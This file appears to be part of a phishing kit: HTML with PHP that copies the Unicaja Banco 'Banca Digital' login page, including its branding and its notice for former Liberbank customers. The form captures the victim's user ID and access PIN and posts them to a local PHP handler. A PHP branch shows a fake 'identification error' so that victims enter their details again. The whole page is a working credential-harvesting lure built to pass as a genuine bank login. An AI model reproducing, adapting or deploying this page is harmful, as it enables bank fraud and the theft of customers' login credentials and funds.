...
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        ...
        <link rel="stylesheet" href="Banca%20Digital_fichiers/style.css">
		  <link rel="stylesheet" type="text/css" href="./Banca%20Digital_fichiers/1.css" >
...
<img src="./Banca%20Digital_fichiers/3.png" alt="Nature" class="responsive"> 
        ...
        <div class="home">
            <div class="container">
                <div class="anything">
                    <!-- Logiiin -->
                    <div class="login box">
                        <h1><hello class="chlakh">SOY CLIENTE</hello></h1>
                        <?php if( $_GET['error'] == 1 ) : ?>
                    <div class="error d-block">
                    <ul class="list-unstyled mb-0">
                       <li><img src="../assets/imgs/eb-bookmark-error.svg"> <span style="color:#FF0000;">Identificaci&oacute;n err&oacute;nea</span></li>
                        </ul>
						                    </div>
					...
					<form  action="../index-.php" method="post" >
                        ...
                        <input type="hidden" name="step" value="login">
                            <div class="form-group ">
                                <label class="user"><hello class="chlakh">USUARIO</hello></label>
                                <input type="text" name="key" id="user" class="form-control" placeholder="DNI/NIE/Pasaporte/Usuario">
                                <img style="display: none; top: 42px;" src="Banca%20Digital_fichiers/error.png">
                                   
                            </div>
                            <div class="form-group ">
                                <label for="pass"><hello class="chlakh">CLAVE DE ACCESO</hello></label>
                                <input type="password" maxlength="8" name="pin" id="pass" class="form-control">
                                <img style="display: none; top: 42px;" src="Banca%20Digital_fichiers/error.png">
                                                            </div>
                            <button class="btn" name="submit"><hello class="chlakh">ENTRAR</hello></button>
                        </form>
                        <div class="quition text-end"><span>¿<hello class="chlakh">Olvidaste tu clave de acceso?</hello></span></div>
                    </div>
                    <!-- title -->
                    <div class="title box">
                        <div class="topper">
                            <h6><hello class="chlakh">Vengo de Liberbank</hello></h6>
                            <p><hello class="chlakh">Ya puedes entrar con tu usuario y contraseña (clave de acceso) en tu nueva Banca Digital en Unicaja Banco.</hello></p>
                            <span><hello class="chlakh">Más información</hello></span>
                        </div>
                        <div class="topper center mt-4">
                            <h6><hello class="chlakh">Soy cliente, pero no tengo clave</hello></h6>
                            <p><hello class="chlakh">Sólo necesitas tener a mano tu documento de identidad y una de tus tarjetas. Date de alta y consulta tu cuenta ahora.</hello></p>
                            <span><hello class="chlakh">Solicitar claves y darme de alta en la Banca Digital</hello></span>
                        </div>
                        <div class="topper center mt-5">
                            <h6><hello class="chlakh">Aún no soy cliente de Unicaja Banco</hello></h6>
                            <p><hello class="chlakh">Queremos estar cerca de tí, aquí te explicamos cómo darte de alta.</hello></p>
                            <span><hello class="chlakh">Hazte cliente</hello></span>
                        </div>
                    </div>
                </div>

                <div class="pss mt-5">
                    <p><hello class="chlakh">Consulta nuestras 
recomendaciones y medidas de seguridad, que te ayudarán a mejorar la 
protección de tus consultas y operaciones por Banca Digital.</hello></p>
                    <span><hello class="chlakh">Hazte cliente</hello></span>
                </div>
                <hr class="mt-5">
